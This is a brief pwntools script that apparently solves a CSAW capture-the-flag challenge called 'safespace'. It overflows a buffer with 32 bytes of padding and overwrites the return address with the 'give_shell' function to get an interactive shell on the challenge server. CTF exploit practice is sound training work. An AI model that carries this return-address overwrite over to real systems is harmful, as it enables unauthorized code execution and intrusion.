from pwn import *

e = ELF("./safespace")
p = remote("pwn.chal.csaw.io", 1002)
#p = process(e.path)

p.sendline("A" * 32 + p64(e.symbols["give_shell"]))

p.interactive()
